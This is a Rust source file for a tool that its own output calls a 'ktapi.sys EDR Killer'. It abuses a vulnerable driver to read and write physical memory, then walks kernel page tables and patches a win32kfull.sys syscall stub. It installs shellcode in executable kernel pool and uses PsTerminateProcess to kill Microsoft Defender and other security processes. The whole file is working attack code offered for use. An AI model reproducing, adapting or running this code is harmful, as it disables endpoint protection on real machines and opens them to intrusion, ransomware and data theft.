#![allow(non_snake_case)]

use std::cell::Cell;
use std::ffi::{c_void, CString};
use std::mem;

use windows::core::{PCSTR, PCWSTR};
use windows::Win32::Foundation::*;
use windows::Win32::System::IO::DeviceIoControl;
use windows::Win32::System::LibraryLoader::{
    GetProcAddress, LoadLibraryExA, DONT_RESOLVE_DLL_REFERENCES, LOAD_LIBRARY_FLAGS,
};

const KUSD_KERNEL: u64 = 0xFFFFF780_00000000;
const KTAPI_MAP: u32 = 0x82007000;
const KTAPI_UNMAP: u32 = 0x82007100;

fn log(msg: &str) { println!("{msg}"); }

#[link(name = "user32")]
unsafe extern "system" {
    fn IsGUIThread(bConvert: i32) -> i32;
}

type CallFn = unsafe extern "system" fn(
    usize, usize, usize, usize, usize, usize, usize,
) -> usize;

// ── ktapi.sys physical memory R/W ───────────────────────────────────────

struct CachedMap { va: *mut u8, phys_base: u64, size: u32 }

struct Ktapi {
    dev: HANDLE,
    cache: Cell<Option<CachedMap>>,
}

#[repr(C)]
struct MapInput { interface_type: u32, bus_number: u32, bus_address: u64, address_space: u32, view_size: u32 }

impl Ktapi {
    fn open() -> Result<Self, String> {
        let path: Vec<u16> = "\\\\.\\ktapi\0".encode_utf16().collect();
        let dev = unsafe {
            windows::Win32::Storage::FileSystem::CreateFileW(
                PCWSTR(path.as_ptr()),
                (0x80000000u32 | 0x40000000u32).into(),
                windows::Win32::Storage::FileSystem::FILE_SHARE_READ
                    | windows::Win32::Storage::FileSystem::FILE_SHARE_WRITE,
                None,
                windows::Win32::Storage::FileSystem::OPEN_EXISTING,
                windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_NORMAL,
                None,
            )
        }.map_err(|e| format!("CreateFileW(ktapi): {e}"))?;
        Ok(Self { dev, cache: Cell::new(None) })
    }

    fn map_phys_raw(&self, phys_addr: u64, size: u32) -> Result<*mut u8, String> {
        let input = MapInput {
            interface_type: 0xFFFF_FFFF, bus_number: 0,
            bus_address: phys_addr, address_space: 0, view_size: size,
        };
        let mut out = [0u8; 24];
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.dev, KTAPI_MAP,
                Some(&input as *const _ as *const c_void), mem::size_of::<MapInput>() as u32,
                Some(out.as_mut_ptr() as *mut c_void), out.len() as u32,
                Some(&mut ret), None,
            ).map_err(|e| format!("ktapi map 0x{phys_addr:X}: {e}"))?;
        }
        let va = u64::from_le_bytes(out[..8].try_into().unwrap());
        if va == 0 { return Err(format!("map NULL for 0x{phys_addr:X}")); }
        Ok(va as *mut u8)
    }

    fn unmap_raw(&self, va: *mut u8) {
        let ptr = va as u64;
        let mut ret = 0u32;
        let _ = unsafe {
            DeviceIoControl(self.dev, KTAPI_UNMAP,
                Some(&ptr as *const _ as *const c_void), 8,
                None, 0, Some(&mut ret), None)
        };
    }

    fn flush_cache(&self) {
        if let Some(c) = self.cache.take() { self.unmap_raw(c.va); }
    }

    fn map_phys(&self, phys_addr: u64, size: u32) -> Result<*mut u8, String> {
        self.flush_cache();
        self.map_phys_raw(phys_addr, size)
    }

    fn unmap(&self, va: *mut u8) { self.unmap_raw(va); }

    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> bool {
        if buf.is_empty() { return true; }
        let page = addr & !0xFFF;
        let off = (addr & 0xFFF) as usize;

        let cm = self.cache.take();
        if let Some(c) = &cm {
            if page >= c.phys_base && addr + buf.len() as u64 <= c.phys_base + c.size as u64 {
                let map_off = (addr - c.phys_base) as usize;
                unsafe { std::ptr::copy_nonoverlapping(c.va.add(map_off), buf.as_mut_ptr(), buf.len()); }
                self.cache.set(cm);
                return true;
            }
            self.unmap_raw(c.va);
        }

        let window_base = page & !0xFFFF;
        let window_size = 0x10000u32;
        let va = match self.map_phys_raw(window_base, window_size) { Ok(v) => v, Err(_) => {
            let sz = ((off + buf.len() + 0xFFF) & !0xFFF) as u32;
            let va = match self.map_phys_raw(page, sz) { Ok(v) => v, Err(_) => return false };
            unsafe { std::ptr::copy_nonoverlapping(va.add(off), buf.as_mut_ptr(), buf.len()); }
            self.unmap_raw(va);
            return true;
        }};

        let map_off = (addr - window_base) as usize;
        unsafe { std::ptr::copy_nonoverlapping(va.add(map_off), buf.as_mut_ptr(), buf.len()); }
        self.cache.set(Some(CachedMap { va, phys_base: window_base, size: window_size }));
        true
    }

    fn write_phys(&self, addr: u64, buf: &[u8]) -> bool {
        if buf.is_empty() { return true; }
        self.flush_cache();
        let page = addr & !0xFFF;
        let off = (addr & 0xFFF) as usize;
        let sz = ((off + buf.len() + 0xFFF) & !0xFFF) as u32;
        let va = match self.map_phys_raw(page, sz) { Ok(v) => v, Err(_) => return false };
        unsafe { std::ptr::copy_nonoverlapping(buf.as_ptr(), va.add(off), buf.len()); }
        self.unmap_raw(va);
        true
    }

    fn read_phys_u64(&self, addr: u64) -> Option<u64> {
        let mut b = [0u8; 8];
        if self.read_phys(addr, &mut b) { Some(u64::from_le_bytes(b)) } else { None }
    }
}

impl Drop for Ktapi {
    fn drop(&mut self) {
        self.flush_cache();
        let _ = unsafe { CloseHandle(self.dev) };
    }
}

// ── Page table walk ─────────────────────────────────────────────────────

fn virt_to_phys(kt: &Ktapi, cr3: u64, va: u64) -> Option<u64> {
    let pml4e = kt.read_phys_u64((cr3 & 0x000F_FFFF_FFFF_F000) + ((va >> 39) & 0x1FF) * 8)?;
    if pml4e & 1 == 0 { return None; }
    let pdpte = kt.read_phys_u64((pml4e & 0x000F_FFFF_FFFF_F000) + ((va >> 30) & 0x1FF) * 8)?;
    if pdpte & 1 == 0 { return None; }
    if pdpte & 0x80 != 0 { return Some((pdpte & 0x000F_FFFF_C000_0000) | (va & 0x3FFF_FFFF)); }
    let pde = kt.read_phys_u64((pdpte & 0x000F_FFFF_FFFF_F000) + ((va >> 21) & 0x1FF) * 8)?;
    if pde & 1 == 0 { return None; }
    if pde & 0x80 != 0 { return Some((pde & 0x000F_FFFF_FFE0_0000) | (va & 0x1F_FFFF)); }
    let pte = kt.read_phys_u64((pde & 0x000F_FFFF_FFFF_F000) + ((va >> 12) & 0x1FF) * 8)?;
    if pte & 1 == 0 { return None; }
    Some((pte & 0x000F_FFFF_FFFF_F000) | (va & 0xFFF))
}

fn vread(kt: &Ktapi, cr3: u64, va: u64, buf: &mut [u8]) -> bool {
    match virt_to_phys(kt, cr3, va) { Some(pa) => kt.read_phys(pa, buf), None => false }
}

fn vread_u32(kt: &Ktapi, cr3: u64, va: u64) -> Option<u32> {
    let mut b = [0u8; 4];
    if vread(kt, cr3, va, &mut b) { Some(u32::from_le_bytes(b)) } else { None }
}

fn vread_u64(kt: &Ktapi, cr3: u64, va: u64) -> Option<u64> {
    virt_to_phys(kt, cr3, va).and_then(|pa| kt.read_phys_u64(pa))
}

fn is_kptr(v: u64) -> bool { v >> 48 == 0xFFFF }

// ── CR3 discovery ───────────────────────────────────────────────────────

fn find_kernel_cr3(kt: &Ktapi) -> Result<u64, String> {
    let kusd_idx = ((KUSD_KERNEL >> 39) & 0x1FF) as usize * 8;
    let mut candidates = Vec::new();
    const REGION: u64 = 0x100000;

    for region_base in (0u64..0x400_0000).step_by(REGION as usize) {
        let va = match kt.map_phys(region_base, REGION as u32) { Ok(v) => v, Err(_) => continue };
        for page_off in (0..REGION as usize).step_by(0x1000) {
            let off = page_off + kusd_idx;
            if off + 8 > REGION as usize { continue; }
            let pml4e = unsafe { std::ptr::read_unaligned(va.add(off) as *const u64) };
            if pml4e & 1 == 0 { continue; }
            if (pml4e & 0x000F_FFFF_FFFF_F000) > 0x8_0000_0000 { continue; }

            let page_pa = region_base + page_off as u64;
            let pfn = page_pa >> 12;
            for e in 0..512usize {
                let eo = page_off + e * 8;
                if eo + 8 > REGION as usize { break; }
                let entry = unsafe { std::ptr::read_unaligned(va.add(eo) as *const u64) };
                if entry & 1 != 0 && (entry & 0x000F_FFFF_FFFF_F000) >> 12 == pfn {
                    candidates.push(page_pa);
                    break;
                }
            }
        }
        kt.unmap(va);
    }

    for &cr3 in &candidates {
        if let Some(pa) = virt_to_phys(kt, cr3, KUSD_KERNEL) {
            let mut b = [0u8; 4];
            if kt.read_phys(pa + 0x26C, &mut b) && u32::from_le_bytes(b) == 10 {
                return Ok(cr3);
            }
        }
    }
    Err("kernel CR3 not found".into())
}

fn find_process_cr3(kt: &Ktapi, cr3: u64, nt_base: u64, target_pid: u32) -> Result<u64, String> {
    let psp = kernel_export_va(kt, cr3, nt_base, "PsInitialSystemProcess").ok_or("PsInitialSystemProcess")?;
    let sys_ep = vread_u64(kt, cr3, psp).ok_or("can't read PsInitialSystemProcess")?;
    if !is_kptr(sys_ep) { return Err("bad PsInitialSystemProcess".into()); }

    let mut buf = vec![0u8; 0x900];
    if !vread(kt, cr3, sys_ep, &mut buf) { return Err("can't read system EPROCESS".into()); }

    for pid_off in (0x100..0x800).step_by(8) {
        if u64::from_le_bytes(buf[pid_off..pid_off+8].try_into().unwrap()) != 4 { continue; }
        let links_off = pid_off + 8;
        if links_off + 8 > buf.len() { continue; }
        let flink = u64::from_le_bytes(buf[links_off..links_off+8].try_into().unwrap());
        if !is_kptr(flink) { continue; }
        let next_ep = flink - links_off as u64;
        let next_pid = vread_u64(kt, cr3, next_ep + pid_off as u64).unwrap_or(0);
        if next_pid == 0 || next_pid > 0x100000 { continue; }

        let mut ep = sys_ep;
        for _ in 0..8192 {
            if vread_u64(kt, cr3, ep + pid_off as u64).unwrap_or(0) == target_pid as u64 {
                let dtb = vread_u64(kt, cr3, ep + 0x28).unwrap_or(0);
                if dtb != 0 && dtb < 0x10_0000_0000 { return Ok(dtb); }
            }
            let fl = vread_u64(kt, cr3, ep + links_off as u64).unwrap_or(0);
            if !is_kptr(fl) { break; }
            ep = fl - links_off as u64;
            if ep == sys_ep { break; }
        }
    }
    Err(format!("CR3 for PID {target_pid} not found"))
}

// ── ntoskrnl + export resolution ────────────────────────────────────────

fn find_ntoskrnl_base(kt: &Ktapi, cr3: u64) -> Result<u64, String> {
    let kd_block = vread_u64(kt, cr3, KUSD_KERNEL + 0x278).unwrap_or(0);
    if is_kptr(kd_block) {
        let base = vread_u64(kt, cr3, kd_block + 0x18).unwrap_or(0);
        if is_kptr(base) {
            let mut h = [0u8; 2];
            if vread(kt, cr3, base, &mut h) && h == *b"MZ" { return Ok(base); }
        }
    }
    for addr in (0xFFFFF800_00000000u64..0xFFFFF810_00000000u64).step_by(0x200000) {
        let pa = match virt_to_phys(kt, cr3, addr) { Some(p) => p, None => continue };
        let mut pe = [0u8; 0x200];
        if !kt.read_phys(pa, &mut pe) || pe[0..2] != *b"MZ" { continue; }
        let lfn = u32::from_le_bytes(pe[0x3C..0x40].try_into().unwrap()) as usize;
        if lfn + 0x54 > pe.len() || &pe[lfn..lfn+4] != b"PE\0\0" { continue; }
        let size = u32::from_le_bytes(pe[lfn+0x50..lfn+0x54].try_into().unwrap()) as u64;
        if size >= 0x100_0000 && kernel_export_va(kt, cr3, addr, "PsInitialSystemProcess").is_some() {
            return Ok(addr);
        }
    }
    Err("ntoskrnl base not found".into())
}

fn kernel_export_va(kt: &Ktapi, cr3: u64, base: u64, target: &str) -> Option<u64> {
    let mut hdr = [0u8; 0x1000];
    if !vread(kt, cr3, base, &mut hdr) { return None; }
    let lfn = u32::from_le_bytes(hdr[0x3C..0x40].try_into().unwrap()) as usize;
    let exp_rva = u32::from_le_bytes(hdr[lfn+0x88..lfn+0x8C].try_into().unwrap()) as u64;
    let exp_sz = u32::from_le_bytes(hdr[lfn+0x8C..lfn+0x90].try_into().unwrap()) as u64;
    if exp_rva == 0 { return None; }

    let mut exp = [0u8; 40];
    if !vread(kt, cr3, base + exp_rva, &mut exp) { return None; }
    let n_funcs = u32::from_le_bytes(exp[20..24].try_into().unwrap());
    let n_names = u32::from_le_bytes(exp[24..28].try_into().unwrap());
    let addr_tbl = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as u64;
    let name_tbl = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as u64;
    let ord_tbl = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as u64;
    if n_names == 0 || n_funcs == 0 { return None; }

    let (mut lo, mut hi) = (0u32, n_names);
    while lo < hi {
        let mid = lo + (hi - lo) / 2;
        let np = vread_u32(kt, cr3, base + name_tbl + mid as u64 * 4)? as u64;
        let mut nb = [0u8; 64];
        if !vread(kt, cr3, base + np, &mut nb) { return None; }
        let end = nb.iter().position(|&b| b == 0).unwrap_or(nb.len());
        let name = std::str::from_utf8(&nb[..end]).unwrap_or("");
        match name.cmp(target) {
            std::cmp::Ordering::Equal => {
                let mut ob = [0u8; 2];
                if !vread(kt, cr3, base + ord_tbl + mid as u64 * 2, &mut ob) { return None; }
                let ord = u16::from_le_bytes(ob) as u64;
                let rva = vread_u32(kt, cr3, base + addr_tbl + ord * 4)? as u64;
                if rva >= exp_rva && rva < exp_rva + exp_sz { return None; }
                return Some(base + rva);
            }
            std::cmp::Ordering::Less => lo = mid + 1,
            std::cmp::Ordering::Greater => hi = mid,
        }
    }
    None
}

// ── Disk PE helpers ─────────────────────────────────────────────────────

fn load_disk_image(name: &str) -> Result<(usize, usize), String> {
    let c = CString::new(name).unwrap();
    let h = unsafe { LoadLibraryExA(PCSTR(c.as_ptr() as _), None, DONT_RESOLVE_DLL_REFERENCES) }
        .map_err(|e| format!("LoadLibraryExA({name}): {e}"))?;
    let b = h.0 as usize;
    let lfn = unsafe { *((b + 0x3C) as *const u32) } as usize;
    Ok((b, unsafe { *((b + lfn + 0x50) as *const u32) } as usize))
}

fn resolve_trigger_fn<T>(dll: &str, name: &str) -> Result<T, String> {
    let c = CString::new(dll).unwrap();
    let h = unsafe { LoadLibraryExA(PCSTR(c.as_ptr() as _), None, LOAD_LIBRARY_FLAGS(0)) }
        .map_err(|e| format!("LoadLibraryExA({dll}): {e}"))?;
    let f = CString::new(name).unwrap();
    let p = unsafe { GetProcAddress(h, PCSTR(f.as_ptr() as _)) }.ok_or_else(|| format!("{name} missing"))?;
    Ok(unsafe { mem::transmute_copy(&p) })
}

fn find_ps_terminate_process(nt_base: u64) -> Result<u64, String> {
    const SIG: [u8; 27] = [
        0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83,
        0xEC, 0x20, 0x65, 0x48, 0x8B, 0x3C, 0x25, 0x88,
        0x01, 0x00, 0x00, 0x44, 0x8B, 0xC2, 0x41, 0xB9,
        0x01, 0x00, 0x00,
    ];
    let (base, size) = load_disk_image("ntoskrnl.exe")?;
    let disk = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
    for i in 0..disk.len().saturating_sub(SIG.len()) {
        if disk[i..i + SIG.len()] == SIG { return Ok(nt_base + i as u64); }
    }
    Err("PsTerminateProcess signature not found".into())
}

fn find_jmp_stub_rva(dll: &str, export: &str) -> Result<u64, String> {
    let c = CString::new(dll).unwrap();
    let h = unsafe { LoadLibraryExA(PCSTR(c.as_ptr() as _), None, DONT_RESOLVE_DLL_REFERENCES) }
        .map_err(|e| format!("LoadLibraryExA({dll}): {e}"))?;
    let f = CString::new(export).unwrap();
    let p = unsafe { GetProcAddress(h, PCSTR(f.as_ptr() as _)) }.ok_or_else(|| format!("{export} missing"))?;
    Ok((p as usize - h.0 as usize) as u64)
}

fn list_edr_processes(targets: &[&str]) -> Vec<(String, u32)> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    let mut r = Vec::new();
    let snap = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(h) => h, Err(_) => return r,
    };
    let mut e = PROCESSENTRY32W { dwSize: mem::size_of::<PROCESSENTRY32W>() as u32, ..Default::default() };
    if unsafe { Process32FirstW(snap, &mut e) }.is_err() { let _ = unsafe { CloseHandle(snap) }; return r; }
    loop {
        let name = String::from_utf16_lossy(
            &e.szExeFile[..e.szExeFile.iter().position(|&c| c == 0).unwrap_or(e.szExeFile.len())]
        );
        for &t in targets { if name.eq_ignore_ascii_case(t) { r.push((name.clone(), e.th32ProcessID)); } }
        if unsafe { Process32NextW(snap, &mut e) }.is_err() { break; }
    }
    let _ = unsafe { CloseHandle(snap) };
    r
}

// ── E9 stub patching ────────────────────────────────────────────────────

struct StubInfo { e9_va: u64, orig_disp: i32 }

fn find_stub_jmp(kt: &Ktapi, cr3: u64, base: u64, stub_rva: u64) -> Result<StubInfo, String> {
    let stub_va = base + stub_rva;
    let mut code = [0u8; 12];
    if !vread(kt, cr3, stub_va, &mut code) { return Err(format!("can't read stub at 0x{stub_va:X}")); }
    if code[7] != 0xE9 { return Err(format!("no E9 at stub+7 (0x{:02X})", code[7])); }
    Ok(StubInfo {
        e9_va: stub_va + 7,
        orig_disp: i32::from_le_bytes(code[8..12].try_into().unwrap()),
    })
}

fn patch_e9(kt: &Ktapi, cr3: u64, stub: &StubInfo, target: u64) -> bool {
    let diff = target as i64 - (stub.e9_va as i64 + 5);
    if diff > i32::MAX as i64 || diff < i32::MIN as i64 { return false; }
    let pa = match virt_to_phys(kt, cr3, stub.e9_va + 1) { Some(p) => p, None => return false };
    kt.write_phys(pa, &(diff as i32).to_le_bytes())
}

fn restore_e9(kt: &Ktapi, cr3: u64, stub: &StubInfo) {
    if let Some(pa) = virt_to_phys(kt, cr3, stub.e9_va + 1) {
        kt.write_phys(pa, &stub.orig_disp.to_le_bytes());
    }
}

// ── win32kfull.sys base scan ────────────────────────────────────────────

fn find_w32kfull_base(kt: &Ktapi, cr3: u64, stub_rva: u64) -> Result<u64, String> {
    let (_, disk_size) = load_disk_image("win32kfull.sys")?;
    let scan_start = 0xFFFFF800_00000000u64;
    let scan_end = 0xFFFFF810_00000000u64;

    let mut va = scan_start;
    while va < scan_end {
        let pml4e = kt.read_phys_u64((cr3 & 0x000F_FFFF_FFFF_F000) + ((va >> 39) & 0x1FF) * 8).unwrap_or(0);
        if pml4e & 1 == 0 { va += 0x80_0000_0000; continue; }
        let pdpte = kt.read_phys_u64((pml4e & 0x000F_FFFF_FFFF_F000) + ((va >> 30) & 0x1FF) * 8).unwrap_or(0);
        if pdpte & 1 == 0 { va += 0x4000_0000; continue; }
        if pdpte & 0x80 != 0 { va += 0x4000_0000; continue; }
        let pde = kt.read_phys_u64((pdpte & 0x000F_FFFF_FFFF_F000) + ((va >> 21) & 0x1FF) * 8).unwrap_or(0);
        if pde & 1 == 0 { va += 0x20_0000; continue; }

        let end = va + 0x20_0000;
        let mut pg = va;
        while pg < end {
            let mut hdr = [0u8; 2];
            if vread(kt, cr3, pg, &mut hdr) && hdr == *b"MZ" {
                let mut pe = [0u8; 0x400];
                if vread(kt, cr3, pg, &mut pe) {
                    let lfn = u32::from_le_bytes(pe[0x3C..0x40].try_into().unwrap()) as usize;
                    if lfn + 0x54 <= pe.len() && &pe[lfn..lfn+4] == b"PE\0\0" {
                        let sz = u32::from_le_bytes(pe[lfn+0x50..lfn+0x54].try_into().unwrap()) as usize;
                        if sz == disk_size {
                            let mut stub = [0u8; 3];
                            if vread(kt, cr3, pg + stub_rva, &mut stub)
                                && (stub == [0x48, 0xFF, 0x25] || stub == [0x4C, 0x8B, 0x15])
                            { return Ok(pg); }
                        }
                    }
                }
            }
            pg += 0x10000;
        }
        va = end;
    }
    Err("win32kfull.sys not found".into())
}

// ── Stage-2 shellcode builder ───────────────────────────────────────────

fn build_stage2(pool_va: u64) -> Vec<u8> {
    let mut sc = Vec::with_capacity(96);
    let a = |v: u64| v.to_le_bytes();
    for (off, mov) in [(0x08u64, &[0x48u8, 0x89, 0xC1][..]),
                        (0x10,    &[0x48, 0x89, 0xC2]),
                        (0x18,    &[0x49, 0x89, 0xC0]),
                        (0x20,    &[0x49, 0x89, 0xC1])] {
        sc.extend_from_slice(&[0x48, 0xA1]);
        sc.extend_from_slice(&a(pool_va + off));
        sc.extend_from_slice(mov);
    }
    sc.extend_from_slice(&[0x48, 0xA1]); sc.extend_from_slice(&a(pool_va));
    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28]);
    sc.extend_from_slice(&[0x48, 0xA3]); sc.extend_from_slice(&a(pool_va + 0x28));
    sc.push(0xC3);
    sc
}

// ── Main ────────────────────────────────────────────────────────────────

fn main() {
    let targets = [
        "MsMpEng.exe", "MpDefenderCoreService.exe", "MsSense.exe",
        "SenseIR.exe", "SenseCncProxy.exe", "SenseSampleUploader.exe",
        "SecurityHealthService.exe",
    ];

    log("\n  ktapi.sys EDR Killer\n");

    // 1. Open driver
    let kt = match Ktapi::open() {
        Ok(d) => { log("[+] ktapi.sys opened"); d }
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };

    // 2. Kernel CR3
    let cr3 = match find_kernel_cr3(&kt) {
        Ok(c) => { log(&format!("[+] CR3 = 0x{c:X}")); c }
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };

    // 3. ntoskrnl base
    let nt = match find_ntoskrnl_base(&kt, cr3) {
        Ok(b) => { log(&format!("[+] ntoskrnl = 0x{b:X}")); b }
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };

    // 4. Resolve kernel functions
    let pool_alloc = kernel_export_va(&kt, cr3, nt, "ExAllocatePoolWithTag").expect("ExAllocatePoolWithTag");
    let ps_lookup = kernel_export_va(&kt, cr3, nt, "PsLookupProcessByProcessId").expect("PsLookupProcessByProcessId");
    let obf_deref = kernel_export_va(&kt, cr3, nt, "ObfDereferenceObject").expect("ObfDereferenceObject");
    let ps_term = match find_ps_terminate_process(nt) {
        Ok(v) => v,
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };
    log(&format!("[+] ExAllocatePoolWithTag      = 0x{pool_alloc:X}"));
    log(&format!("[+] PsLookupProcessByProcessId = 0x{ps_lookup:X}"));
    log(&format!("[+] PsTerminateProcess          = 0x{ps_term:X}"));
    log(&format!("[+] ObfDereferenceObject         = 0x{obf_deref:X}"));

    // 5. win32kfull.sys
    unsafe { IsGUIThread(1) };
    let my_cr3 = match find_process_cr3(&kt, cr3, nt, std::process::id()) {
        Ok(c) => c,
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };
    let cc_stub_rva = find_jmp_stub_rva("win32kfull.sys", "NtGdiPtInRegion").unwrap();
    let call_stub_rva = find_jmp_stub_rva("win32kfull.sys", "NtGdiSetMagicColors").unwrap();
    let w32k = match find_w32kfull_base(&kt, my_cr3, cc_stub_rva) {
        Ok(b) => { log(&format!("[+] win32kfull.sys = 0x{b:X}")); b }
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };
    let call_stub = match find_stub_jmp(&kt, my_cr3, w32k, call_stub_rva) {
        Ok(s) => s, Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };
    let call_trig: CallFn = resolve_trigger_fn("win32u.dll", "NtGdiSetMagicColors").unwrap();

    // 6. Allocate RWX pool (NonPagedPool = 0 = executable)
    log("[*] Allocating kernel pool...");
    if !patch_e9(&kt, my_cr3, &call_stub, pool_alloc) {
        log("[-] E9 patch failed"); std::process::exit(1);
    }
    let tag = u32::from_le_bytes(*b"kllr");
    let pool_va = unsafe { (call_trig)(0, 0x100, tag as usize, 0, 0, 0, 0) } as u64;
    if pool_va < 0xFFFF_8000_0000_0000 {
        log("[-] Pool allocation failed"); restore_e9(&kt, my_cr3, &call_stub); std::process::exit(1);
    }
    let pool_pa = virt_to_phys(&kt, cr3, pool_va).expect("pool PA");
    log(&format!("[+] Pool = 0x{pool_va:X}"));

    // 7. Write two-stage shellcode
    //   Stage-1: 12 bytes in CC padding → trampoline to stage-2
    //   Stage-2: in pool+0x80 → load args from pool, call target, store result
    let tramp_va = w32k + cc_stub_rva + 12;
    let tramp_pa = virt_to_phys(&kt, my_cr3, tramp_va).expect("tramp PA");
    let mut orig_cc = [0u8; 12];
    vread(&kt, my_cr3, tramp_va, &mut orig_cc);

    let s2_ptr_va = pool_va + 0x78;
    kt.write_phys(pool_pa + 0x78, &(pool_va + 0x80).to_le_bytes());
    let b = s2_ptr_va.to_le_bytes();
    kt.write_phys(tramp_pa, &[0x48, 0xA1, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7], 0xFF, 0xE0]);
    kt.write_phys(pool_pa + 0x80, &build_stage2(pool_va));

    if !patch_e9(&kt, my_cr3, &call_stub, tramp_va) {
        log("[-] E9 patch to trampoline failed");
        restore_e9(&kt, my_cr3, &call_stub); kt.write_phys(tramp_pa, &orig_cc);
        std::process::exit(1);
    }
    log("[+] Shellcode installed");

    // 8. KernelCall: batch-write args to pool, trigger syscall, read result
    let kernel_call = |kt: &Ktapi, target: u64, a1: u64, a2: u64, a3: u64, a4: u64| -> u64 {
        let buf: [u64; 6] = [target, a1, a2, a3, a4, 0];
        kt.write_phys(pool_pa, unsafe { std::slice::from_raw_parts(buf.as_ptr() as *const u8, 48) });
        unsafe { (call_trig)(0, 0, 0, 0, 0, 0, 0) };
        kt.read_phys_u64(pool_pa + 0x28).unwrap_or(0)
    };

    // Smoke test
    let test = kernel_call(&kt, pool_alloc, 0, 8, tag as u64, 0);
    if test < 0xFFFF_8000_0000_0000 {
        log("[-] KernelCall test failed");
        restore_e9(&kt, my_cr3, &call_stub); kt.write_phys(tramp_pa, &orig_cc);
        std::process::exit(1);
    }
    log(&format!("[+] KernelCall OK (0x{test:X})"));

    // 9. Kill
    let procs = list_edr_processes(&targets);
    if procs.is_empty() {
        log("[*] No targets found");
    } else {
        for (name, pid) in &procs {
            let eproc_slot = pool_va + 0x30;
            kt.write_phys(pool_pa + 0x30, &0u64.to_le_bytes());

            let st = kernel_call(&kt, ps_lookup, *pid as u64, eproc_slot, 0, 0);
            if st as i32 != 0 { log(&format!("[-] PsLookup({name}/{pid}) = 0x{st:X}")); continue; }

            let eproc = kt.read_phys_u64(pool_pa + 0x30).unwrap_or(0);
            if !is_kptr(eproc) { log(&format!("[-] bad EPROCESS for {name}")); continue; }

            let st = kernel_call(&kt, ps_term, eproc, 0, 0, 0);
            if st as i32 == 0 { log(&format!("[+] KILLED {name} (PID {pid})")); }
            else { log(&format!("[-] PsTerminate({name}) = 0x{st:X}")); }

            kernel_call(&kt, obf_deref, eproc, 0, 0, 0);
        }
    }

    // 10. Restore
    restore_e9(&kt, my_cr3, &call_stub);
    kt.write_phys(tramp_pa, &orig_cc);
    log("[+] Done");
}
